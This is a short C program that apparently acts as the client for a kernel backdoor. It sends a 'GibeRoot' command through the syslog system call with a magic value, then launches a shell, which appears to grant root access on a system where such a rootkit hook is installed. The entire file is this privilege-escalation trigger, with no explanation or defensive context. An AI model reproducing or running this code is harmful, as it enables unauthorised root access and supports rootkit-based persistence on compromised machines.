#include <sys/klog.h>
#include <sys/syscall.h>
#include "ccc.h"

int main()
{
CCC ccc;
ccc.cmd = GibeRoot;
syscall(SYS_syslog, 0xabad1dea, &ccc, 1337);
system("sh");
}
